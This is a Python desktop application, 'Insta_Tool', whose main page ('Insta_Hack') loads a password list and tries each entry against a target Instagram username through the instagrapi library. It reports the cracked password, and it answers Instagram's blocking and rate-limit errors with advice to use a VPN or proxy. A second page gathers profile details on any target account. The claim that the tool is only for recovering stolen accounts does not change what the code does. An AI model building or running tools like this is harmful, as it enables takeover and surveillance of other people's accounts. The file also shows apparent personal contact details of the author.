from flet import *
import instagrapi , os
from instagrapi.exceptions import *
from instagrapi.extractors import *
from instagrapi.zones import *
from instagrapi.utils import *
from time import sleep
from customtkinter import *
def main(page:Page):
    page.padding=0
    page.window.height=600
    page.title='Insta_Tool'
    page.window.width=330
    bot_1 = instagrapi.Client()
    def Stop(*a):
        Statu.value="Off"
        Statu.color=colors.RED
        username.read_only=False
        UPLOAD_FILE.disabled=False
        Stop_Button.disabled=True
        number_of_fin.read_only=False
        number_of_start.read_only=False
        Start_Button.disabled=False
        pro1.value=0
        page.update()
    def dialogpicker(e:FilePickerResultEvent):
        # e.files is a list of files 
        
        if e.files is None: return
        for x in e.files:
        #do_something
        # x.name to get the name of the file
        # x.path to get the path of the file
            #print(x.path)
            file_path.value=x.path
            with open(file=x.path,mode="r") as file:
                file_of_passwords = file.readlines()
                number_of_fin.value=len(file_of_passwords)
                number_of_start.value=1
                file.close()
                Statu.value="Off"
                Statu.color=colors.RED
                UPLOAD_FILE.icon=icons.DELETE
                page.update()
                number_of_start.read_only=False
                number_of_fin.read_only=False
                page.update()
                def gg(*f):
                    file_path.value=""
                    UPLOAD_FILE.icon=icons.UPLOAD_FILE
                    number_of_start.value=""
                    number_of_fin.value=""
                    Statu.color=colors.WHITE30
                    page.update()
                    number_of_start.read_only=True
                    number_of_fin.read_only=True
                    UPLOAD_FILE.on_click=pick_file
                UPLOAD_FILE.on_click=gg
            page.update()
    def try_pass(*args):
        if username.value.replace(" ","")=="":
            dlg.title=Text(value="Error",color=colors.WHITE,weight=FontWeight.BOLD,italic=True)
            dlg.actions=[Text(value="Please enter the username")]
            dlg.bgcolor=colors.RED
            page.open(dlg);page.update()
        elif file_path.value.replace(" ","")=="":
            dlg.title=Text(value="Error",color=colors.WHITE,weight=FontWeight.BOLD,italic=True)
            dlg.actions=[Text(value="Please set a list of passwords")]
            dlg.bgcolor=colors.RED
            page.open(dlg);page.update()       
        elif file_path.value!="" and username.value!="":
                            try:
                                number_of_start_trying=int(number_of_start.value)
                                pro1.value=None
                                page.update()
                                with open(file=str(file_path.value),mode="r") as file_:
                                    lines=file_.readlines()                        
                                    Start_Button.disabled=True
                                    Stop_Button.disabled=False
                                    UPLOAD_FILE.disabled=True
                                    Try_password.value=""
                                    number_of_start.read_only=True
                                    number_of_fin.read_only=True
                                    Statu.read_only=False
                                    Statu.value="On"
                                    page.update()
                                    Statu.color=colors.GREEN
                                    username.read_only=True
                                    Statu.read_only=True
                                    number_of_lines = len(lines)
                                    page.update()
                                    number_of_start_trying=int(number_of_start.value)
                            

                                    for i in range(number_of_lines+1):    
                                        try:      
                                            num = int(number_of_fin.value)-int(number_of_start.value)
                                            print(num)
                                            int(number_of_start_trying)-5
                                            int(number_of_fin.value)
                                            
                                            if str(Statu.value).replace(" ","")=="On" and not "-" in str(num) and not "-" in str(number_of_fin.value) and not "-" in str(number_of_start.value):
                                                    
                                                    Bot = instagrapi.Client()
                                                    passwords=str(lines[int(number_of_start_trying)-1]).replace("\n","").strip()
                                                    Try_password.value=Try_password.value+f"{int(number_of_start_trying)} Password  == >>  "+passwords+""
                                                    Bot.login(username=username.value,password=passwords)
                                                    print(passwords)
                                                    Try_password.value=Try_password.value+" success!\n "
                                                    dlg.title=Text(value="congratulations!",color=colors.WHITE,weight=FontWeight.BOLD,italic=True)
                                                    dlg.actions=[Text(value=f"The Password is {passwords}",color="white")]
                                                    dlg.bgcolor=colors.GREEN
                                                    page.open(dlg);page.update()
                                                    page.update()
                                                    Stop()
                                                    break
                                            elif int(number_of_start.value)>len(lines):
                                                dlg.title=Text(value="Error",color=colors.WHITE,weight=FontWeight.BOLD,italic=True)
                                                dlg.actions=[Text(value="Choose autre number for start ㄟ( ▔, ▔ )ㄏ")]
                                                dlg.bgcolor=colors.RED
                                                page.open(dlg);page.update()    
                                                Stop()  
                                            elif "-" in str(number_of_start.value):
                                                dlg.title=Text(value="Error",color=colors.WHITE,weight=FontWeight.BOLD,italic=True)
                                                dlg.actions=[Text(value="Choose autre number for start ㄟ( ▔, ▔ )ㄏ")]
                                                dlg.bgcolor=colors.RED
                                                page.open(dlg);page.update()    
                                                Stop()                        
                                            elif "-" in str(number_of_fin.value):
                                                dlg.title=Text(value="Error",color=colors.WHITE,weight=FontWeight.BOLD,italic=True)
                                                dlg.actions=[Text(value="Choose autre number for finish ㄟ( ▔, ▔ )ㄏ")]
                                                dlg.bgcolor=colors.RED
                                                page.open(dlg);page.update()    
                                                Stop()  

                                                
                                            else :#str(Statu.value).replace(" ","")=="Off"
                                                number_of_start.read_only=False
                                                number_of_fin.read_only=False
                                                Stop()
                                        except ValueError:
                                            dlg.title=Text(value="Error",color=colors.WHITE,weight=FontWeight.BOLD,italic=True)
                                            dlg.actions=[Text(value="Please Enter correct Number for start and finish")]
                                            dlg.bgcolor=colors.RED
                                            page.open(dlg);page.update()
                                            Stop()
                                            

                                        except UserNotFound :
                                            Try_password.value=Try_password.value=Try_password.value+f" User Not Found\n"
                                            dlg.title=Text(value="Error",color=colors.WHITE,weight=FontWeight.BOLD,italic=True)
                                            dlg.actions=[Text(value="User Not Found")]
                                            dlg.bgcolor=colors.RED
                                            page.open(dlg);page.update()
                                            Start_Button.disabled=False
                                            Stop_Button.disabled=True
                                            number_of_start.read_only=False
                                            number_of_fin.read_only=False
                                            page.update()
                                            Stop()
                                            
                                        except UserError as usert:
                                            print(usert)
                                            Try_password.value=Try_password.value=Try_password.value+f" Error==>>>{usert}\n"
                                            

                                        except ConnectionError :
                                            Try_password.value=Try_password.value+"\nYou Have A Bad Internet ㄟ( ▔, ▔ )ㄏ"
                                            dlg.title=Text(value="Error",color=colors.WHITE,weight=FontWeight.BOLD,italic=True)
                                            dlg.actions=[Text(value="You Have A Bad Internet ㄟ( ▔, ▔ )ㄏ")]
                                            dlg.bgcolor=colors.RED
                                            page.open(dlg);page.update()
                                            Start_Button.disabled=False
                                            number_of_start.read_only=False
                                            number_of_fin.read_only=False
                                            Stop_Button.disabled=True
                                            page.update()
                                            Stop()      
                                            break
                                        except TimeoutError :
                                            Try_password.value=Try_password.value+"\n You Have A Bad Internet ㄟ( ▔, ▔ )ㄏ"
                                            dlg.title=Text(value="Error",color=colors.WHITE,weight=FontWeight.BOLD,italic=True)
                                            dlg.actions=[Text(value="You Have A Bad Internet ㄟ( ▔, ▔ )ㄏ")]
                                            dlg.bgcolor=colors.RED
                                            page.open(dlg);page.update()
                                            Start_Button.disabled=False
                                            number_of_start.read_only=False
                                            number_of_fin.read_only=False
                                            Stop_Button.disabled=True
                                            page.update()
                                            Stop()                   
                                            break        
                                        except IndexError as ind:
                                            print(ind)
                                            Try_password.value=Try_password.value+" List Finish Try autre password list ㄟ( ▔, ▔ )ㄏ"
                                            dlg.title=Text(value="Error",color=colors.WHITE,weight=FontWeight.BOLD,italic=True)
                                            dlg.actions=[Text(value="List Finish Try autre password list ㄟ( ▔, ▔ )ㄏ")]
                                            dlg.bgcolor=colors.RED
                                            page.open(dlg);page.update()
                                            Start_Button.disabled=False
                                            number_of_start.read_only=False
                                            number_of_fin.read_only=False
                                            Stop_Button.disabled=True
                                            page.update()
                                            Stop()   
                                        except Exception as error:
                                            print(error)
                                            if "challenge_required" in str(error):
                                                Try_password.value=Try_password.value=Try_password.value+" failed Use Vpn Or Proxy For Good Result.\n"
                                                #sleep(5*60)
                                                page.update()
                                                #int(number_of_start_trying)-=1
                                            elif "Please wait a few minutes before you try again." in str(error):
                                                Try_password.value=Try_password.value=Try_password.value+" failed Use Vpn Or Proxy For Good Result.\n"
                                                #sleep(5*60)
                                                page.update()
                                                #int(number_of_start_trying)-=1
                                            elif "Instagram has blocked your IP address, use a quality proxy provider (not free, not shared)" in str(error):
                                                Try_password.value=Try_password.value=Try_password.value+" failed Use Vpn Or Proxy For Good Result.\n"
                                                #sleep(1*60)
                                                page.update()
                                                #int(number_of_start_trying)-=1
                                            elif "because it is added to the blacklist of the Instagram Server" in str(error):
                                                Try_password.value=Try_password.value=Try_password.value+" failed Use Vpn Or Proxy For Good Result.\n"
                                                page.update()
                                                #sleep(1*60)
                                                #int(number_of_start_trying)-=1
                                            elif "ConnectionError" in str(error):
                                                Try_password.value=Try_password.value+"You Have A Bad Internet ㄟ( ▔, ▔ )ㄏ"
                                                dlg.title=Text(value="Error",color=colors.WHITE,weight=FontWeight.BOLD,italic=True)
                                                dlg.actions=[Text(value="You Have A Bad Internet ㄟ( ▔, ▔ )ㄏ")]
                                                dlg.bgcolor=colors.RED
                                                page.open(dlg);page.update()
                                                Start_Button.disabled=False
                                                number_of_start.read_only=False
                                                number_of_fin.read_only=False
                                                Stop_Button.disabled=True
                                                page.update()
                                                Stop()                   
                                                break     
                                            else:
                                                Try_password.value=Try_password.value=Try_password.value+" failed\n"
                                            number_of_start_trying+=1
                                            page.update()
                            except ValueError:
                                dlg.title=Text(value="Error",color=colors.WHITE,weight=FontWeight.BOLD,italic=True)
                                dlg.actions=[Text(value="Please Enter correct Number for start and finish")]
                                dlg.bgcolor=colors.RED
                                page.open(dlg);page.update()
                            except TypeError:
                                dlg.title=Text(value="Error",color=colors.WHITE,weight=FontWeight.BOLD,italic=True)
                                dlg.actions=[Text(value="Please Enter correct Number for start and finish")]
                                dlg.bgcolor=colors.RED
                                page.open(dlg);page.update()
                            except FileNotFoundError:
                                dlg.title=Text(value="Error",color=colors.WHITE,weight=FontWeight.BOLD,italic=True)
                                dlg.actions=[Text(value="Please choose autre file")]
                                dlg.bgcolor=colors.RED
                                page.open(dlg);page.update()                            
                            except:
                                pass             
    def login(*args):
        username_of_account.read_only=True;code2.read_only=True
        password_of_account.read_only=True
        pro.value=None
        menu.disabled=True
        page.update()
        if username_of_account.value.replace(" ","")=="":
            username_of_account.error_text="Please Enter Username"
            username_of_account.read_only=False
            password_of_account.read_only=False;code2.read_only=False
            pro.value=0
            menu.disabled=False
            page.update()
        elif password_of_account.value.replace(" ","")=="":
            username_of_account.error_text=""
            password_of_account.error_text="Please Enter Password"
            username_of_account.read_only=False
            password_of_account.read_only=False;code2.read_only=False
            pro.value=0
            menu.disabled=False
            page.update()
        elif password_of_account.value!="" and username_of_account.value!="":
            try:
                username_of_account.error_text=""
                password_of_account.error_text=""
                login_bo.disabled=True
                menu.disabled=True
                page.update()
                bot_1.logout()
                sleep(1)
                bot_1.login(username=str(username_of_account.value).replace("\n","").strip(),password=str(password_of_account.value).replace("\n","").strip())
                dlg.title=Text(value="congratulations!",color=colors.WHITE,weight=FontWeight.BOLD,italic=True)
                dlg.actions=[Text(value=f"You have been logged in successfully",color="white")]
                dlg.bgcolor=colors.GREEN
                
                username_of_account.read_only=False
                password_of_account.read_only=False;code2.read_only=False
                menu.disabled=False
                login_bo.disabled=False
                pro.value=0
                page.update()
                page.go("/txt3")
                page.open(dlg);page.update()
            except Exception as error_:
                dlg.title=Text(value="Error",color=colors.WHITE,weight=FontWeight.BOLD,italic=True)
                dlg.actions=[Text(value=f"{error_}")]
                dlg.bgcolor=colors.RED
                page.open(dlg);page.update()
                username_of_account.read_only=False
                password_of_account.read_only=False;code2.read_only=False
                login_bo.disabled=False
                menu.disabled=False
                pro.value=0
                page.update()
    def Stop_information(*m):
        Statu_of_information.value="Off"
        Statu_of_information.color=colors.RED
        Start_Button_information.disabled=False
        Stop_Button_information.disabled=True
        login_bo.disabled=False
        user_name.read_only=False 
        menu.disabled=False
        number_of_start_information.value=0
        page.update()
    def start_information(*e):
        if user_name.value!="":

            Statu_of_information.value="On"
            Statu_of_information.color=colors.GREEN
            Start_Button_information.disabled=True
            Stop_Button_information.disabled=False
            user_name.read_only=True
            number_of_start_information.value=0
            login_bo.disabled=True
            menu.disabled=True
            
            Try_information.value=""
            page.update()
            try:
                info_ = bot_1.user_info_by_username(username=user_name.value)
                num_=1
                number_of_start_information.value=len(list(info_))
                page.update()
                for i in range(len(list(info_))):
                    if num_!=len(list(info_)):
                        Try_information.value=Try_information.value+"\n"+str(list(info_)[num_]).replace("')","\n").replace("('","").replace(",",":").replace("'","").replace(")","").replace("None","Not Found").replace("Url","")
                        print(str(list(info_)[num_]).replace("')","\n").replace("('","").replace(",",":").replace("'","").replace(")","").replace("None","Not Found").replace("Url",""))
                        num_+=1
                    elif num_==len(list(info_)):
                        Statu_of_information.value="Off"
                        Statu_of_information.color=colors.RED
                        Start_Button_information.disabled=False
                        Stop_Button_information.disabled=True
                        login_bo.disabled=False
                        user_name.read_only=False 
                        menu.disabled=False
                        page.update()
                        break
                
                
                
            except Exception as error:
                dlg.title=Text(value="Error",color=colors.WHITE,weight=FontWeight.BOLD,italic=True)
                dlg.actions=[Text(value=f"{error}")]
                dlg.bgcolor=colors.RED
                page.open(dlg);page.update()
                Stop_information()
        else:
                dlg.title=Text(value="Error",color=colors.WHITE,weight=FontWeight.BOLD,italic=True)
                dlg.actions=[Text(value="Please Enter Username")]
                dlg.bgcolor=colors.RED
                page.open(dlg);page.update()
    def opp_(*m):
            dlg.title=Text(value="Info",color=colors.WHITE,weight=FontWeight.BOLD,italic=True)
            dlg.actions=[Text(value=f"Log in to your account via a regular browser, then come back and log in here")]
            dlg.bgcolor=colors.RED
            page.open(dlg);page.update()
    def opp__(*m):
            dlg.title=Text(value="Info",color=colors.WHITE,weight=FontWeight.BOLD,italic=True)
            dlg.actions=[Text(value=f"Log in to your account via a regular browser, then come back and log in here")]
            dlg.bgcolor=colors.RED
            page.open(dlg)
            page.update()

    page.window.center()
    pick = FilePicker(on_result=dialogpicker)
    page.overlay.append(pick)
    dlg = AlertDialog(
        title=Text(""))
    drawer = NavigationDrawer(bgcolor=colors.BLACK,
        
        indicator_color=colors.RED,
        
        elevation=20,
        
        controls=[
            Container(height=18,width=2),
            CupertinoButton(text="Home",height=50,icon=icons.HOME,on_click=lambda _: page.go("/txt") ),
            Divider(thickness=2),
            CupertinoButton(text="Get Password",height=50,icon=icons.PASSWORD,on_click=lambda _: page.go("/txt1")),
            Container(height=11,width=2),
            Divider(thickness=2),
            CupertinoButton(text="Get information",height=50,icon=icons.INFO,on_click=lambda _: page.go("/txt2")),
            Container(height=11,width=2),
            Divider(thickness=2),
            CupertinoButton(text="About us",height=50,icon=icons.GROUP,on_click=lambda _: page.go("/txt4"))
            
        ]
    )
    def route_change(route):
        page.views.clear()
        page.views.append(
            View(padding=0,route="/txt1",controls=[txt1],drawer=drawer))
        if page.route=='/txt1':
             page.views.append(
                  View(padding=0,route='/txt',controls=[txt],drawer=drawer))
        if page.route=='/txt2':
             page.views.append(
                  View(padding=0,route='/txt2',controls=[txt2],drawer=drawer))
        if page.route=='/txt3':
             page.views.append(
                  View(padding=0,route='/txt3',controls=[txt3],drawer=drawer))
        if page.route=='/txt4':
             page.views.append(
                  View(padding=0,route='/txt4',controls=[txt4],drawer=drawer))
        page.update()
    page.on_route_change = route_change
    page.go(page.route)
    page.drawer=drawer
    def op(*e):
        page.drawer.open=True;page.update()
        page.update()
    
    page.update()
    def pick_file(e,*args):
        pick.pick_files(allow_multiple=False,allowed_extensions=["txt"])
    username=TextField(border_color=colors.BACKGROUND,prefix_text="@",border_radius=15,prefix_icon=icons.PERSON,bgcolor='black',height=57,hint_text="Username",tooltip="Type here",hint_style=TextStyle(color=colors.WHITE30))
    file_path = CupertinoTextField(border_radius=15,placeholder_text=".txt file source",read_only=True,placeholder_style=TextStyle(color=colors.WHITE30),width=240,expand=True)
    Statu=CupertinoTextField(max_lines=1,width=50,read_only=True,value="Off",color=colors.WHITE30,expand=True)
    number_of_start=CupertinoTextField(max_lines=1,width=50,read_only=True,expand=True)
    number_of_fin=CupertinoTextField(max_lines=1,width=50,read_only=True,expand=True)
    Start_Button = ElevatedButton(on_click=try_pass,text="Start",width=140,expand=True,bgcolor=colors.GREEN,color=colors.WHITE)
    Stop_Button =    ElevatedButton(expand=True,disabled=True,text="Stop",on_click=Stop,bgcolor=colors.RED,width=140,color=colors.WHITE)
    Try_password=CupertinoTextField(show_cursor=True,read_only=True,multiline=True,text_size=13,expand=True,expand_loose=True,height=10000000)
    UPLOAD_FILE=IconButton(icon=icons.UPLOAD_FILE,on_click=pick_file)
    user_name= TextField(border_color=colors.BACKGROUND,prefix_text="@",border_radius=15,prefix_icon=icons.PERSON,bgcolor='black',height=57,hint_text="Username",tooltip="Type here",hint_style=TextStyle(color=colors.WHITE30))
    Statu_of_information=CupertinoTextField(max_lines=1,width=50,read_only=True,value="Off",color=colors.WHITE30,expand=True)
    number_of_start_information=CupertinoTextField(max_lines=1,width=50,read_only=True,expand=True)
    Start_Button_information = ElevatedButton(text="Start",width=140,expand=True,bgcolor=colors.GREEN,color=colors.WHITE,on_click=start_information)
    Stop_Button_information =    ElevatedButton(expand=True,disabled=True,text="Stop",bgcolor=colors.RED,width=140,color=colors.WHITE)
    Try_information=CupertinoTextField(show_cursor=True,read_only=True,multiline=True,text_size=13,expand=True,expand_loose=True,height=10000000)
    password_of_account=TextField(border_radius=15,bgcolor="white",hint_text="Password",hint_style=TextStyle(color=colors.BLACK45),text_style=TextStyle(color=colors.BLACK),password=True,can_reveal_password=True)
    username_of_account=TextField(prefix_text="@",border_radius=15,bgcolor="white",hint_text="Username",hint_style=TextStyle(color=colors.BLACK45),text_style=TextStyle(color=colors.BLACK))
    code2=TextField(border_radius=15,bgcolor="white",hint_text="2FA verification code",helper_text="optional",hint_style=TextStyle(color=colors.BLACK45),text_style=TextStyle(color=colors.BLACK))
    pro=ProgressBar(width=20000,value=0)
    pro1=ProgressBar(width=20000,value=0)
    
    menu=IconButton(icon=icons.MENU,on_click=op,icon_size=20)
    login_bo=ElevatedButton(autofocus=True,text="Login",expand_loose=True,style=ButtonStyle(bgcolor=colors.WHITE,color=colors.BLACK),on_click=login)
    txt1 = Container(image_repeat=ImageRepeat.REPEAT,image_src=r"C:\Users\ninja\Desktop\my_qouran\assets\dc252909-d887-44c9-afad-b2f14a865ed5.jpeg",expand_loose=True,padding=20,expand=True,bgcolor=colors.BACKGROUND,content=Column(expand=True,horizontal_alignment=CrossAxisAlignment.CENTER,controls=[Container(height=18,width=2),Container(alignment=alignment.top_center,content=(Row(alignment=MainAxisAlignment.SPACE_EVENLY,controls=[Container(alignment=alignment.top_left,padding=10,content=IconButton(icon=icons.MENU,icon_size=20,on_click=op)),Container(expand=True,content=Text(expand=True,text_align=TextAlign.CENTER,value="Home  ",italic=False,weight=FontWeight.W_900,size=40)),Text(value="  "),Text(value="   "),Text(value="  ")]))),Container(height=18,width=2),Text(text_align=TextAlign.CENTER,value="This application is designed only for the purpose of trying to recover the stolen account. If you are unable to recover it, you can log in to another account through our application and write the username of the targeted account and request information about it. With my thanks\n\n\nInsta_Tool Team",color=colors.WHITE,bgcolor=colors.BLACK,weight=FontWeight.W_100,max_lines=True),Text(value="\n\n\n\n𓆩⚝𓆪")]))
    txt2 =  Container(image_repeat=ImageRepeat.REPEAT,image_src=r"C:\Users\ninja\Desktop\my_qouran\assets\dc252909-d887-44c9-afad-b2f14a865ed5.jpeg",expand=True,alignment=alignment.top_center,padding=20,content=Column(horizontal_alignment=CrossAxisAlignment.CENTER,controls=[pro,Row(controls=[menu,Image(expand=True,src=r"C:\Users\ninja\Desktop\my_qouran\assets\instagram_2504918.png",width=60,height=60),Text(" "),Text(" "),Text(" ")]),Text(" "),username_of_account,password_of_account,code2,login_bo,Text(value=" "),Container(alignment=alignment.top_left,content=TextButton(text="Many Error And Password is Correct ?",style=ButtonStyle(color=colors.RED),on_click=opp_)),Container(alignment=alignment.top_left,content=TextButton(text="Many Error in login?",style=ButtonStyle(color=colors.RED),on_click=opp__))],expand=True))
    txt3 =  Container(image_repeat=ImageRepeat.REPEAT,image_src=r"C:\Users\ninja\Desktop\my_qouran\assets\dc252909-d887-44c9-afad-b2f14a865ed5.jpeg",expand=True,alignment=alignment.top_center,padding=20,content=Column(horizontal_alignment=CrossAxisAlignment.CENTER,controls=[Row(alignment=MainAxisAlignment.SPACE_EVENLY,controls=[Container(padding=0,content=IconButton(icon=icons.MENU,on_click=op,icon_size=20)),Container(expand=True,content=Text(text_align=TextAlign.CENTER,expand=True,expand_loose=True,value="Insta_Info",italic=False,style=TextStyle(size=35,weight=FontWeight.BOLD))),Text(value="    ")]),Text("")   ,user_name ,Row(alignment=alignment.top_center,vertical_alignment=CrossAxisAlignment.CENTER,width=2000,controls=[Text("Statu"),Statu_of_information,Text("Number of info"),  number_of_start_information]),Row(alignment=alignment.top_center,vertical_alignment=CrossAxisAlignment.CENTER,width=2000,controls=[Start_Button_information,Stop_Button_information]),Try_information],expand=True))
    txt =  Container(image_repeat=ImageRepeat.REPEAT,image_src=r"C:\Users\ninja\Desktop\my_qouran\assets\dc252909-d887-44c9-afad-b2f14a865ed5.jpeg",expand=True,alignment=alignment.top_center,padding=20,content=Column(horizontal_alignment=CrossAxisAlignment.CENTER,controls=[pro1,Row(alignment=MainAxisAlignment.SPACE_EVENLY,controls=[Container(padding=0,content=IconButton(icon=icons.MENU,on_click=op,icon_size=20)),Container(expand=True,content=Text(text_align=TextAlign.CENTER,expand=True,expand_loose=True,value="Insta_Hack",italic=False,style=TextStyle(size=35,weight=FontWeight.BOLD))),Text(value="    ")]),Text("")   ,username ,Row(controls=[file_path        ,UPLOAD_FILE]),Row(alignment=alignment.top_center,vertical_alignment=CrossAxisAlignment.CENTER,width=2000,controls=[Text("Statu"),Statu,Text("From"),  number_of_start  ,Text("To"),number_of_fin]),Row(alignment=alignment.top_center,vertical_alignment=CrossAxisAlignment.CENTER,width=2000,controls=[Start_Button,Stop_Button]),Try_password],expand=True))
    txt4 =  Container(image_repeat=ImageRepeat.REPEAT,image_src=r"C:\Users\ninja\Desktop\my_qouran\assets\dc252909-d887-44c9-afad-b2f14a865ed5.jpeg",expand=True,alignment=alignment.top_center,padding=20,content=Column(horizontal_alignment=CrossAxisAlignment.CENTER,controls=[Row(controls=[IconButton(icon=icons.MENU,icon_size=20,on_click=op),Text(value="About Insta_Tool",text_align=TextAlign.CENTER,size=28,weight=FontWeight.W_900,expand=True),Text(" "),Text(" "),Text(" ")]),Text(" "),Text(value="This application has been programmed by one person currently but the idea was inspired by other people. This application was made for people who lost their accounts.\n\n Contact information\n\nmustaphakessassi76@gmail.com\n+212 674527025",text_align=TextAlign.CENTER,style=TextStyle(color=colors.WHITE,bgcolor="black"))],expand=True))
    #page.add(txt1)
    sleep(3)
    page.go(page.route)
app(main)
